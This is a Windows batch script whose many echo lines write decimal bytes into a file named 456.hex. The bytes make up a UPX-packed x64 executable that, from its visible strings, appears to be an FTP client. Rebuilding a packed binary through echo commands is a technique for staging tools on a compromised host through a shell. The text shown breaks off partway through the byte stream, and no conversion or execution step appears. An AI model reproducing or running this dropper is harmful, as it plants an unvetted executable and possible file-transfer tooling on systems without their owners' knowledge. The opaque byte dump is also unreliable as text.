@echo off
echo|set /p=>456.hex
echo|set /p=77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 232 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 >>456.hex
echo|set /p=206 93 186 82 138 60 212 1 138 60 212 1 138 60 212 1 131 68 80 1 139 60 212 1 131 68 65 1 139 60 212 1 131 68 71 1 135 60 212 1 138 60 213 1 19 60 212 1 131 68 87 1 152 60 212 1 131 68 93 1 128 60 212 1 131 68 64 1 139 60 212 1 131 68 69 1 139 60 212 1 82 105 99 104 138 60 212 1 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 80 69 0 0 100 134 3 0 149 168 231 76 0 0 0 0 0 0 0 0 240 0 34 0 >>456.hex
echo|set /p=11 2 9 0 0 96 0 0 0 16 0 0 0 16 1 0 112 113 1 0 0 32 1 0 0 0 0 0 1 0 0 0 0 16 0 0 0 2 0 0 6 0 1 0 6 0 1 0 6 0 1 0 0 0 0 0 0 144 1 0 0 16 0 0 0 0 0 0 3 0 64 129 0 0 8 0 0 0 0 0 0 32 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 16 0 0 0 0 0 0 0 0 0 0 0 0 135 1 0 224 1 0 0 >>456.hex
echo|set /p=0 128 1 0 0 7 0 0 0 48 1 0 44 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 85 80 88 48 0 0 0 0 0 16 1 0 0 16 0 0 >>456.hex
echo|set /p=0 0 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 128 0 0 224 85 80 88 49 0 0 0 0 0 96 0 0 0 32 1 0 0 84 0 0 0 4 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 224 46 114 115 114 99 0 0 0 0 16 0 0 0 128 1 0 0 10 0 0 0 88 0 0 0 0 0 0 0 0 0 0 0 0 0 0 64 0 0 192 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 >>456.hex
echo|set /p=0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 51 46 57 49 0 85 80 88 33 13 36 2 8 233 217 230 240 19 243 2 226 119 89 1 0 103 81 0 0 0 188 0 0 73 2 0 117 >>456.hex
echo|set /p=117 2 42 144 0 132 136 132 60 121 129 230 134 140 136 12 238 155 207 94 166 192 7 167 96 76 116 101 110 101 120 57 179 252 166 249 105 109 97 103 101 73 98 105 110 97 114 121 65 251 255 131 124 97 115 99 105 105 85 83 69 82 32 97 110 111 110 121 109 111 117 115 15 183 217 218 127 80 65 83 83 32 37 115 64 2 31 32 32 124 5 1 59 205 183 23 84 89 80 69 32 15 207 191 242 249 0 116 121 112 101 65 80 7 83 84 79 82 37 222 88 211 252 0 104 0 115 0 >>456.hex
echo|set /p=58 119 10 51 46 3 110 143 188 237 4 119 98 39 82 69 84 84 77 80 67 109 112 219 185 152 219 7 69 8 187 12 0 102 116 6 228 255 218 110 97 39 78 76 81 127 114 116 0 0 67 87 68 231 217 71 158 68 69 76 82 78 70 82 7 84 79 123 179 221 176 45 155 232 76 73 59 0 220 218 255 223 90 80 2 32 116 111 32 108 111 99 97 108 45 102 105 108 101 157 158 27 210 224 139 7 97 63 255 247 215 62 255 7 65 67 67 84 88 80 116 63 88 77 75 124 108 251 >>456.hex
echo|set /p=34 183 7 82 77 135 72 131 80 95 8 177 191 55 11 23 81 85 73 115 42 248 135 252 238 63 32 39 58 32 37 119 115 10 118 101 114 98 111 115 230 99 173 80 50 107 8 239 114 97 99 101 247 216 237 240 115 116 97 116 127 22 110 100 239 109 100 105 32 47 20 222 219 114 15 97 109 101 7 159 27 104 101 108 59 230 126 191 112 11 99 118 35 113 117 18 7 105 116 228 187 194 205 252 112 119 100 0 3 114 111 68 17 111 112 187 125 239 107 60 23 109 20 7 108 96 109 107 >>456.hex
echo|set /p=87 230 102 147 221 19 103 101 14 7 90 180 54 230 220 101 77 34 0 108 82 160 54 102 109 43 39 7 99 83 117 56 104 104 239 252 91 104 7 103 108 111 98 66 62 237 185 182 209 76 60 110 145 77 74 70 185 247 96 238 98 117 103 27 78 0 99 108 237 7 125 104 109 219 213 98 121 9 98 23 84 115 112 112 182 247 208 141 233 63 11 33 7 99 98 219 82 161 125 91 104 83 161 107 60 66 117 102 102 130 61 230 6 161 189 100 32 66 121 74 66 83 53 31 253 231 190 17 >>456.hex
echo|set /p=200 56 3 41 37 45 42 115 9 199 63 154 238 7 23 92 47 203 47 67 0 62 213 47 180 65 186 39 58 67 188 130 111 108 32 93 112 111 165 80 3 153 92 73 110 245 112 116 105 204 84 126 174 21 251 144 115 68 71 12 144 204 182 105 40 38 101 41 56 13 10 164 201 141 194 205 243 65 66 7 195 209 216 126 115 121 110 99 32 71 102 104 102 107 108 43 76 152 23 69 254 97 115 25 22 62 155 13 23 203 32 72 101 22 65 102 79 27 207 26 79 86 143 76 84 68 52 51 >>456.hex
echo|set /p=109 77 145 43 26 71 248 84 34 174 183 181 19 118 116 104 96 67 114 59 187 32 27 23 108 152 227 32 70 219 28 47 18 227 66 50 199 78 72 51 103 112 108 121 158 221 10 155 92 120 192 238 110 103 52 119 105 77 237 75 230 86 67 87 80 218 7 100 225 230 182 176 44 2 23 69 80 124 50 124 4 219 239 134 91 2 100 124 15 46 50 102 47 255 244 143 242 254 87 214 63 79 78 73 78 36 169 252 169 241 210 77 98 80 63 255 255 127 194 20 64 143 64 82 83 68 83 248 >>456.hex
echo|set /p=126 102 83 251 214 74 73 175 163 111 118 6 217 205 126 202 126 214 132 1 7 46 112 100 98 71 72 137 92 36 8 125 247 95 222 4 108 36 16 116 36 24 87 72 129 236 176 47 72 139 5 202 150 191 253 123 219 6 51 196 22 132 36 160 17 141 84 36 40 4 76 36 96 51 219 255 223 246 219 72 33 52 32 51 255 199 68 17 100 171 21 166 245 255 255 133 192 15 132 150 99 155 255 2 0 11 191 72 141 140 36 208 186 200 26 11 248 131 110 255 126 214 3 27 68 141 67 48 >>456.hex
echo|set /p=67 48 51 210 232 15 140 156 195 182 214 237 71 52 76 15 32 4 75 48 57 25 57 178 107 28 89 48 2 212 247 133 176 109 215 62 13 149 250 14 57 94 232 82 3 20 38 187 237 220 146 18 103 96 179 216 72 132 139 45 25 236 230 84 4 73 24 25 248 50 216 118 179 68 96 76 139 192 21 211 74 2 129 109 182 23 81 44 48 240 116 67 70 237 123 121 190 21 232 36 13 45 249 66 200 2 219 178 107 255 198 72 131 193 96 186 160 39 171 34 86 168 205 179 216 246 206 178 >>456.hex
echo|set /p=149 244 8 206 207 66 199 242 246 221 204 28 5 150 244 54 195 19 200 51 210 102 144 145 231 128 244 130 199 108 115 251 217 135 184 176 235 89 124 133 201 116 6 73 221 246 230 218 100 123 133 219 116 20 67 82 44 49 24 131 205 158 231 60 244 255 57 72 24 35 246 220 134 99 123 13 132 126 186 159 158 167 162 176 123 66 55 51 248 140 210 51 204 17 135 140 92 110 127 184 124 156 36 244 73 139 91 16 3 107 24 115 32 203 96 204 190 227 95 195 204 0 35 116 87 54 252 227 >>456.hex
echo|set /p=111 69 236 32 131 61 194 194 57 139 218 116 34 77 178 190 221 39 225 240 251 30 127 14 147 186 30 114 233 93 46 11 119 9 119 131 249 93 141 13 61 61 167 251 190 223 205 55 108 5 236 147 208 7 66 207 128 178 53 57 114 115 167 133 15 184 138 247 203 247 187 99 238 164 31 48 90 187 186 207 53 43 211 227 239 191 110 129 212 189 235 12 139 203 72 3 66 72 120 235 71 99 27 220 70 178 151 51 93 3 248 72 121 140 189 146 153 246 144 164 22 114 230 182 99 159 116 3 >>456.hex
echo|set /p=198 183 66 236 107 127 77 158 121 235 190 242 29 232 201 174 140 48 98 8 3 15 143 221 186 221 223 17 183 21 120 34 15 142 15 21 68 75 16 194 246 57 179 69 84 91 33 9 17 11 0 56 14 217 14 75 8 11 240 16 118 243 241 240 37 24 246 116 93 167 79 65 74 146 241 27 100 235 246 199 224 186 33 65 44 25 27 217 26 208 198 23 32 30 220 103 118 80 126 242 196 117 8 94 138 231 88 119 198 22 103 92 9 247 89 242 211 209 98 147 219 36 191 16 146 49 217 240 >>456.hex
echo|set /p=54 8 208 164 174 89 8 204 93 92 104 51 76 31 178 252 199 5 233 183 221 119 63 121 116 13 31 10 36 137 5 220 16 235 77 31 179 188 108 219 174 123 21 48 200 24 92 156 7 203 77 76 139 141 45 219 235 49 249 75 33 174 193 203 96 103 164 14 192 188 203 193 187 97 104 156 241 74 205 74 56 51 29 177 172 145 177 196 32 99 135 182 15 91 225 104 121 42 250 117 15 151 105 10 222 145 93 66 100 169 245 186 34 115 97 110 103 194 105 87 183 199 150 10 184 6 215 118 >>456.hex
echo|set /p=124 141 222 185 14 150 164 55 73 51 115 226 61 194 220 132 60 32 135 80 245 48 186 35 214 162 27 228 251 240 242 8 128 153 95 134 91 195 231 5 32 15 69 200 195 14 131 59 0 97 96 155 238 248 117 152 71 8 186 36 157 141 249 148 124 186 16 114 125 53 60 187 16 114 186 37 121 186 211 61 16 86 189 9 182 2 116 235 204 194 109 19 2 79 8 120 99 167 10 108 239 222 126 15 117 229 5 116 83 173 67 24 77 24 24 65 128 56 32 27 184 109 14 18 44 83 8 47 >>456.hex
echo|set /p=141 245 118 13 25 236 235 16 17 139 246 117 79 171 123 224 246 86 19 175 186 106 1 89 68 2 23 194 219 189 68 137 29 102 16 235 50 112 222 38 36 7 144 39 47 244 226 239 194 72 30 202 108 227 64 211 249 251 87 211 40 254 185 153 141 21 10 245 6 13 3 254 133 60 182 123 69 51 201 71 70 0 47 40 195 204 20 114 228 201 149 218 244 211 253 113 121 158 141 67 108 116 124 65 84 219 182 227 237 68 136 234 139 241 73 117 35 60 122 29 131 120 198 135 18 49 107 19 >>456.hex
echo|set /p=114 7 54 124 213 220 134 119 123 15 118 18 230 39 112 251 245 234 42 106 209 191 105 184 18 30 130 203 90 224 166 58 141 87 1 20 204 175 115 228 150 115 51 15 175 218 242 27 243 183 62 50 73 42 240 139 215 43 214 172 39 185 214 188 228 39 206 73 3 204 234 242 238 18 53 236 49 198 236 86 204 178 139 249 72 46 131 172 205 197 241 53 210 184 100 60 188 249 45 59 197 254 2 125 56 143 197 76 114 178 41 217 248 68 33 135 242 43 24 219 118 23 207 235 19 108 60 3 >>456.hex
echo|set /p=223 195 39 176 32 27 145 90 243 225 248 241 118 72 154 35 57 242 44 43 254 223 144 41 107 230 71 184 234 225 8 41 57 129 156 234 240 227 240 129 132 239 200 240 183 89 196 6 125 179 109 183 217 118 194 125 13 20 15 131 164 145 235 4 4 254 200 45 220 117 16 16 118 60 237 116 55 168 16 116 51 100 195 36 205 34 243 80 26 108 241 180 217 46 228 100 206 57 26 235 45 145 99 108 190 111 69 0 15 190 59 240 125 100 242 23 219 95 223 101 242 86 97 26 15 68 202 36 >>456.hex
echo|set /p=23 95 231 121 54 222 228 113 255 236 108 116 177 192 250 144 124 65 92 195 227 243 137 201 186 160 65 85 231 242 37 20 157 228 4 114 100 129 187 198 241 22 0 35 164 57 114 100 240 165 240 45 60 144 7 200 174 182 113 240 83 239 145 241 146 147 22 0 76 239 120 54 75 243 243 13 89 182 53 194 194 249 62 182 194 114 1 151 178 197 159 154 14 240 221 131 83 114 46 188 235 184 106 191 247 108 187 155 1 76 99 233 12 21 247 170 83 117 71 188 103 187 109 20 254 3 14 47 >>456.hex
echo|set /p=53 48 79 21 244 19 103 35 140 53 122 234 83 194 112 233 23 12 61 240 237 190 254 213 212 211 61 173 183 232 0 31 217 115 51 131 47 194 199 148 238 237 73 190 101 238 191 54 236 131 37 95 3 123 177 73 11 51 114 27 217 11 201 236 57 21 156 250 140 108 103 48 32 226 23 136 226 214 96 217 132 19 173 91 198 66 110 184 223 4 90 117 114 47 130 185 234 207 230 121 100 11 76 139 224 61 233 238 3 182 27 105 33 112 151 57 235 26 50 34 207 238 99 216 19 254 235 239 >>456.hex
echo|set /p=192 253 248 224 220 103 156 2 4 8 20 21 41 139 151 186 51 75 26 132 64 72 149 73 59 253 194 241 124 60 240 20 170 141 64 146 72 80 145 4 26 131 141 93 143 145 119 116 52 213 147 139 225 88 149 104 148 112 24 72 27 54 244 228 137 120 32 51 246 224 139 249 233 117 12 55 240 144 46 74 8 99 131 255 34 45 221 184 52 155 135 44 189 23 71 23 239 85 110 184 3 210 205 24 38 15 172 183 237 227 144 52 71 248 237 44 139 213 169 230 37 15 242 4 180 73 3 205 >>456.hex
echo|set /p=199 237 37 39 57 242 251 73 3 253 169 236 24 38 154 159 143 228 162 236 61 175 179 29 24 192 255 178 57 37 79 12 192 24 38 100 237 205 157 83 114 47 18 233 37 66 250 25 58 2 40 24 8 196 212 23 240 156 192 130 108 157 40 238 240 198 236 183 67 242 140 7 42 43 235 242 57 53 3 217 12 217 20 179 239 48 215 236 41 121 217 217 185 235 216 94 235 182 235 221 2 231 200 195 178 44 191 14 19 164 117 226 37 48 161 18 228 20 115 16 17 198 122 235 30 8 182 13 >>456.hex
echo|set /p=201 237 198 198 144 190 66 18 187 214 34 110 160 179 184 72 40 161 199 48 42 39 159 200 230 87 99 242 35 185 25 87 199 182 228 200 9 228 12 237 25 242 170 235 144 71 72 115 235 235 48 244 177 201 120 32 15 183 235 153 234 15 207 41 121 201 25 242 146 234 159 177 53 205 41 121 201 8 190 252 189 25 242 84 238 156 146 147 235 49 2 231 37 244 1 186 91 64 30 255 108 189 165 119 128 190 67 215 55 130 4 51 237 235 110 32 99 246 43 190 201 33 93 231 131 130 90 19 >>456.hex
echo|set /p=83 170 144 101 235 214 70 140 116 57 55 14 211 17 220 115 235 42 254 204 254 64 40 182 0 207 145 13 169 31 236 28 236 208 195 200 22 161 240 172 41 162 22 189 212 12 118 4 92 26 16 192 133 101 60 116 8 37 127 195 31 24 147 75 48 242 32 80 233 224 134 187 71 184 181 68 50 96 201 176 73 250 117 45 26 245 153 229 214 65 51 93 236 194 44 192 8 45 112 245 111 2 247 217 72 27 210 72 35 72 60 31 118 27 220 21 212 32 21 28 107 44 232 252 254 37 1 15 >>456.hex
echo|set /p=236 126 177 253 51 145 27 252 194 97 235 54 203 50 210 237 190 233 200 200 24 117 69 20 80 182 92 50 210 92 48 63 161 27 147 182 51 210 50 140 12 1 0 152 145 91 83 109 200 26 21 31 177 112 185 25 12 54 7 11 221 232 65 184 31 217 156 225 158 95 20 77 155 203 198 5 104 194 117 179 117 150 0 33 179 139 29 13 111 206 21 114 220 104 215 175 16 238 11 6 193 219 114 184 201 12 37 79 175 6 142 236 200 61 180 239 43 128 20 234 89 234 129 134 37 71 82 243 >>456.hex
echo|set /p=167 119 171 132 45 198 238 25 23 154 234 57 116 212 169 240 108 127 93 26 132 48 131 199 8 204 7 219 154 156 116 93 228 32 72 16 9 23 115 47 151 109 128 179 137 53 74 119 84 33 231 119 199 76 86 189 165 231 66 137 5 142 251 0 0 83 6 205 166 41 56 178 232 50 51 139 107 83 110 115 22 228 132 40 22 235 111 18 62 38 185 178 41 144 144 137 129 104 223 135 77 247 76 69 57 60 251 12 46 232 161 37 205 205 140 189 46 53 69 69 103 121 182 74 6 233 129 60 >>456.hex
echo|set /p=51 235 159 101 203 217 218 150 92 44 231 16 195 58 76 190 62 102 129 79 133 96 76 112 97 112 26 122 120 3 80 111 194 24 188 117 120 146 137 96 24 107 64 5 141 181 131 214 228 69 85 103 151 203 64 184 239 118 223 6 102 68 57 37 88 7 117 77 38 232 199 64 224 13 121 45 229 22 54 45 51 210 222 109 148 82 8 108 216 208 192 221 181 243 73 227 120 137 100 17 67 6 107 248 30 110 221 108 31 207 159 54 247 32 39 33 65 59 252 222 198 173 240 147 88 23 47 96 >>456.hex
echo|set /p=73 69 221 187 65 0 233 234 174 80 239 64 13 35 91 103 243 48 145 206 55 183 193 147 93 39 172 173 58 116 56 54 29 231 54 116 156 146 52 203 226 31 21 79 250 230 144 108 9 107 23 31 75 53 153 146 147 205 33 209 230 53 127 229 182 103 155 31 41 51 28 148 10 66 148 12 246 252 38 137 13 208 172 248 27 42 121 164 139 140 216 85 123 203 186 54 88 228 203 5 97 10 40 98 66 14 102 182 64 199 61 16 172 152 45 25 100 61 55 150 32 79 3 188 98 235 72 48 >>456.hex
echo|set /p=251 93 99 97 142 57 103 71 15 148 193 137 13 51 91 56 246 216 13 77 239 229 118 69 186 57 178 9 16 36 93 204 63 228 146 131 28 132 171 123 171 175 14 185 72 6 58 244 235 67 6 100 64 111 59 52 27 158 11 226 199 171 27 171 78 229 60 182 132 71 195 77 72 133 26 133 108 9 207 51 61 154 120 94 114 144 135 247 172 175 163 175 247 228 32 47 146 75 62 104 175 36 151 188 228 95 175 183 228 64 228 178 135 92 4 251 170 63 119 131 188 72 6 65 16 170 7 174 >>456.hex
echo|set /p=208 173 48 131 9 131 42 9 97 221 214 2 127 7 46 91 8 254 83 144 133 140 205 35 186 66 22 83 191 24 22 167 75 49 44 33 123 78 32 71 54 154 174 223 228 33 175 66 154 35 71 125 227 190 227 67 3 121 128 60 199 169 138 227 36 47 57 201 108 226 33 175 101 226 173 11 154 45 77 113 2 111 181 7 54 23 210 211 125 55 143 181 239 87 45 227 84 115 74 78 68 219 222 52 54 241 50 232 49 148 116 35 202 133 228 168 129 67 68 124 175 222 9 131 27 48 10 117 >>456.hex
echo|set /p=13 52 190 81 202 154 196 178 135 60 134 124 62 154 16 8 47 127 158 46 94 10 3 141 250 29 112 160 144 182 4 203 135 10 61 34 198 90 56 201 84 106 137 8 60 251 242 174 2 186 209 23 254 127 219 30 201 21 249 1 118 80 128 123 1 58 117 74 15 190 59 5 139 247 245 16 35 110 127 61 226 85 19 73 113 178 125 251 101 248 64 27 207 131 233 64 26 26 21 3 116 71 46 74 88 225 139 16 194 139 76 94 49 235 106 34 247 128 2 91 112 196 36 56 241 17 58 165 >>456.hex
echo|set /p=44 159 155 115 182 13 67 150 225 121 13 20 69 120 209 239 20 235 184 8 250 200 32 48 178 22 197 200 86 248 88 246 128 225 186 70 92 58 10 22 11 201 145 142 132 69 170 225 187 33 59 232 176 93 221 71 224 0 8 99 6 5 57 16 8 220 155 114 100 115 8 36 23 254 171 67 226 57 114 228 4 36 75 225 224 34 225 7 200 35 164 44 43 167 238 146 147 60 144 224 208 223 36 75 200 147 83 242 201 223 213 166 62 179 201 201 43 57 53 179 145 224 71 129 60 66 78 63 >>456.hex
echo|set /p=220 245 225 90 36 15 228 239 219 217 219 71 54 167 176 19 37 104 179 170 248 224 35 71 78 32 37 208 150 223 215 30 32 15 146 223 224 165 163 223 75 78 242 64 133 222 37 208 39 71 78 201 126 222 139 165 244 177 59 100 115 74 54 232 177 37 208 64 223 156 85 195 35 238 218 80 104 9 79 187 144 167 134 225 66 51 45 60 144 71 130 114 130 224 124 218 143 164 220 129 102 13 225 117 159 233 138 69 82 221 255 92 155 138 68 41 68 150 42 169 92 14 86 44 187 213 38 192 >>456.hex
echo|set /p=100 223 46 148 23 178 83 40 27 145 4 222 157 147 52 71 69 222 72 248 232 82 156 92 184 215 43 215 142 81 164 207 243 167 216 150 7 20 222 247 18 244 75 250 77 78 194 246 220 142 40 27 22 239 220 33 55 143 132 130 252 163 61 101 176 114 249 21 237 39 104 8 161 39 163 184 222 230 200 201 86 173 86 221 151 221 154 185 29 146 74 43 223 171 165 163 182 32 7 114 202 173 102 221 72 107 182 145 92 65 79 77 3 174 74 142 97 162 182 156 58 173 175 37 39 155 90 66 >>456.hex
echo|set /p=139 5 221 73 155 144 165 57 179 216 120 79 103 16 185 241 178 170 16 179 117 11 26 97 216 88 117 118 28 235 64 52 85 222 183 7 121 118 60 3 117 15 72 73 222 215 51 216 217 220 128 85 30 29 13 19 31 210 21 7 25 199 9 216 168 92 185 192 136 21 23 84 238 100 163 17 226 83 3 214 222 156 144 224 192 126 58 161 74 41 102 206 35 25 185 9 220 75 183 215 237 22 116 208 37 138 126 158 106 8 8 221 133 182 149 2 44 98 108 234 17 125 47 57 111 213 118 221 >>456.hex
echo|set /p=53 10 6 116 70 218 161 7 177 16 116 11 93 244 182 1 128 32 23 48 117 242 153 112 13 154 219 16 141 116 41 64 195 249 91 84 54 192 62 166 193 55 166 226 68 176 69 239 147 221 137 29 37 24 232 90 110 182 25 13 131 141 143 32 43 128 56 108 24 104 108 1 162 185 163 197 204 110 225 11 2 184 87 43 226 98 118 122 242 185 108 91 34 226 165 219 165 76 220 132 112 131 69 153 94 198 21 63 210 4 8 43 79 237 161 30 178 108 122 139 217 163 134 165 190 42 90 207 >>456.hex
echo|set /p=195 216 108 192 219 86 1 245 59 197 43 64 142 192 145 207 96 218 53 161 218 35 125 129 22 162 50 57 45 174 160 162 203 104 140 56 33 113 218 101 252 160 211 149 17 255 217 86 132 147 151 102 75 255 22 162 64 136 40 57 82 115 228 29 89 160 194 172 251 153 43 65 113 194 66 178 30 219 163 188 217 214 6 144 79 9 253 217 243 165 163 60 144 7 200 10 205 217 175 216 200 41 57 129 168 216 181 159 146 124 136 201 30 233 18 172 146 147 29 201 68 158 106 217 76 66 199 239 >>456.hex
echo|set /p=156 24 213 37 99 195 52 241 102 247 229 28 60 116 199 248 234 4 18 222 121 4 26 232 59 120 24 128 62 124 116 156 230 175 219 163 139 192 238 23 85 109 21 136 24 188 107 48 212 189 6 128 120 1 108 38 11 126 137 198 76 105 106 203 59 221 126 49 25 220 207 200 175 76 39 5 192 13 131 253 1 71 255 142 209 25 57 39 200 142 255 197 40 59 235 124 211 38 137 4 24 104 147 24 146 35 159 143 52 32 128 2 250 116 242 228 9 115 112 2 168 218 44 218 64 38 57 242 >>456.hex
echo|set /p=29 10 163 79 217 203 115 4 142 112 47 18 26 237 215 104 46 216 7 147 8 73 78 168 25 37 44 17 100 55 158 149 203 210 2 199 182 230 250 215 199 18 216 72 220 214 107 224 100 65 75 90 86 213 214 164 249 249 200 25 61 226 157 29 75 170 255 100 129 243 118 46 225 8 4 15 143 63 75 146 77 36 59 232 78 92 117 217 6 121 46 241 139 240 94 29 211 197 7 151 234 28 229 13 254 215 46 1 254 125 208 222 61 183 76 179 131 157 7 48 71 252 235 56 214 94 80 232 >>456.hex
echo|set /p=90 78 117 68 42 84 57 22 252 11 78 65 184 108 39 84 0 2 239 218 215 166 68 204 210 81 76 39 57 129 40 255 199 7 152 219 64 109 67 16 103 149 231 228 129 188 144 216 135 210 113 210 237 90 243 5 225 141 133 154 46 46 104 8 235 198 74 154 154 233 11 137 157 98 117 174 100 80 46 5 224 191 122 217 45 124 102 242 175 3 141 121 255 185 245 97 232 206 230 23 31 30 77 32 249 10 93 217 10 192 36 84 141 68 167 16 207 54 236 109 128 60 181 68 214 223 72 186 >>456.hex
echo|set /p=128 92 184 53 239 198 85 72 0 188 31 213 75 46 152 179 29 10 190 22 213 169 37 35 124 159 72 14 24 194 231 133 108 24 121 10 228 215 124 209 70 240 115 144 199 102 209 2 116 23 193 160 16 144 229 194 213 81 159 172 38 84 164 33 84 26 144 145 91 181 242 148 213 79 199 8 204 182 83 66 251 112 2 89 14 57 33 128 2 32 40 103 235 192 1 64 83 164 88 220 6 207 221 108 182 53 199 5 203 12 129 5 213 59 201 13 192 14 136 91 54 57 178 121 129 87 48 111 >>456.hex
echo|set /p=166 159 235 213 28 57 114 2 48 163 137 212 202 212 3 228 17 210 82 211 154 201 73 30 200 150 212 120 211 48 163 228 201 41 121 113 211 125 154 230 166 228 228 149 28 221 166 57 212 83 64 30 33 167 231 207 13 214 12 146 7 242 151 207 129 207 57 178 121 32 59 49 171 106 158 175 212 28 57 114 2 49 223 77 211 142 211 242 0 121 144 151 153 90 211 94 114 146 7 60 210 49 223 53 210 7 121 114 74 65 153 170 165 161 165 242 8 121 37 253 210 171 206 32 15 228 17 217 >>456.hex
echo|set /p=212 91 206 133 192 32 121 69 206 255 219 76 50 200 48 110 32 187 2 211 151 15 55 24 234 1 59 203 99 51 23 53 6 3 50 201 145 157 75 211 206 51 205 49 120 82 38 233 209 3 42 210 84 146 73 30 33 51 152 206 146 35 117 242 246 209 240 111 216 208 200 2 94 114 51 244 209 208 17 72 236 234 121 61 222 151 71 114 59 251 213 37 92 74 234 60 164 112 158 213 69 78 201 201 148 209 85 66 205 9 152 68 255 37 85 8 190 255 1 229 202 97 225 59 91 210 118 13 >>456.hex
echo|set /p=198 28 31 24 89 182 33 219 18 83 147 208 85 22 90 188 181 43 240 146 1 124 97 20 175 87 225 192 96 27 36 38 210 32 186 112 38 216 174 222 7 117 66 255 206 37 19 84 221 96 236 190 96 51 99 53 208 246 221 88 250 208 176 48 228 129 252 207 181 255 71 70 194 190 221 59 223 124 164 136 20 204 235 129 60 144 210 70 204 48 204 225 129 100 72 14 32 48 229 90 24 72 111 105 244 9 233 54 53 185 224 234 154 94 117 14 117 90 233 174 140 152 114 169 41 148 71 221 >>456.hex
echo|set /p=29 200 9 177 203 155 13 137 61 157 117 197 2 195 80 175 111 210 51 11 237 67 78 52 192 6 16 147 27 118 35 91 1 233 85 83 133 232 209 197 135 13 65 231 212 139 223 249 255 234 236 12 13 28 200 217 18 73 108 216 43 85 87 210 25 255 163 54 33 114 51 183 115 166 26 38 108 221 132 149 58 144 176 98 165 235 211 79 200 75 45 204 107 51 219 57 29 213 232 110 217 118 124 117 8 141 67 1 69 53 243 225 194 209 149 112 207 18 152 90 47 206 21 189 45 25 205 246 >>456.hex
echo|set /p=118 16 59 186 101 61 234 133 72 187 35 116 116 14 10 229 195 117 45 206 230 154 22 164 82 17 228 38 159 206 216 32 79 220 21 116 234 76 32 201 20 110 255 38 62 2 136 24 138 205 60 113 116 4 60 81 117 10 191 156 226 188 219 246 79 60 121 116 8 60 89 21 58 78 5 187 16 56 219 66 56 116 252 208 196 89 177 13 48 151 42 217 32 222 135 246 98 23 206 128 18 202 201 164 249 196 3 124 126 67 206 111 126 64 3 38 12 129 73 207 205 25 197 74 104 199 214 51 >>456.hex
echo|set /p=182 86 171 24 51 104 2 9 91 87 52 23 69 107 148 13 32 20 30 7 209 65 8 118 223 235 75 196 120 139 83 179 208 125 205 76 243 33 91 23 6 43 103 181 167 41 231 204 243 236 142 132 109 182 4 134 64 59 92 8 68 19 135 31 11 112 71 251 57 31 15 149 195 4 166 4 134 1 220 27 24 13 244 20 124 32 86 123 65 82 64 30 245 144 35 220 105 48 8 105 238 104 255 32 56 69 141 97 1 11 152 65 139 212 95 245 161 220 136 55 201 34 255 200 16 88 230 102 >>456.hex
echo|set /p=216 168 222 104 2 94 25 229 202 134 205 246 86 18 199 116 28 29 249 185 114 49 237 14 240 72 17 81 232 65 7 195 204 186 43 159 234 215 89 0 64 174 200 214 47 137 52 13 164 217 112 117 31 103 219 204 16 60 55 224 140 55 132 185 36 208 45 239 198 115 99 46 175 109 55 235 21 0 125 229 246 11 153 183 105 15 183 64 24 102 84 206 146 116 215 153 160 184 157 46 86 96 65 189 3 173 28 123 67 231 137 37 241 146 6 14 151 37 153 221 179 177 20 5 154 18 211 146 >>456.hex
echo|set /p=12 61 129 126 205 125 189 148 61 42 146 1 100 5 84 22 230 150 69 28 123 254 35 45 75 221 89 41 239 135 122 217 234 238 47 196 65 43 244 158 197 247 137 180 113 225 193 21 86 221 93 40 52 125 255 163 45 120 67 181 60 21 65 176 28 93 73 87 123 176 125 59 45 116 9 4 47 68 20 231 159 90 250 38 65 59 239 15 190 200 158 110 199 57 160 178 140 253 3 191 57 149 131 233 65 8 137 32 254 242 246 54 125 95 204 116 60 4 207 116 36 205 116 20 65 59 207 110 >>456.hex
